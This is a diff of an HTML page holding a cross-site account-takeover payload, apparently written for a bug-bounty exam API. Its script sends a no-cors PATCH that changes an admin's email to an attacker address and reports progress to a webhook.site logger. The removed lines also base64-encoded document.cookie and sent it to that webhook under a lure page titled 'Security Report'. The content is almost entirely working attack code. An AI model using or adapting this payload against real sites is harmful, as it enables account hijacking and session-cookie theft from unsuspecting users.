@@ -1,45 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Security Report</title>
-</head>
 <body>
-    <h1>Loading Evidence... Please Wait.</h1>
     <script>
-        const WEBHOOK_URL = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-        const TARGET_API = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+        const logger = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
 
-        // 1. Log the visit immediately
-        fetch(WEBHOOK_URL + "?log=bot_entered&id=69e16464bee6d6b7c6627539");
+        // 1. Log that the bot is executing the attack
+        fetch(logger + "?status=executing_payload");
 
-        // 2. The ATO Attack (The "Patch")
-        // Note: We use 'no-cors' so the browser doesn't block the request.
-        fetch(TARGET_API, {
+        // 2. The PATCH request to change Admin's email
+        fetch(target, {
             method: "PATCH",
-            mode: "no-cors",
+            mode: "no-cors", 
             headers: {
                 "Content-Type": "text/plain" 
             },
             body: JSON.stringify({
-                "fullName": "Pwned Admin",
-                "email": "rundlady@gongjua.com", // This changes the account to your control
-                "phoneNumber": "999999999",
-                "address": {
-                    "street": "123 Victory Lane",
-                    "city": "Tripoli",
-                    "state": "FL",
-                    "zipCode": "33601",
-                    "country": "US"
-                }
+                "fullName": "Admin Pwned",
+                "email": "hacker-takeover@example.com"
             })
         }).then(() => {
-            fetch(WEBHOOK_URL + "?log=patch_sent");
+            fetch(logger + "?status=attack_finished");
         });
-
-        // 3. Cookie Steal (In case the session is not HttpOnly)
-        if (document.cookie) {
-            fetch(WEBHOOK_URL + "?cookie=" + btoa(document.cookie));
-        }
     </script>
 </body>
 </html>
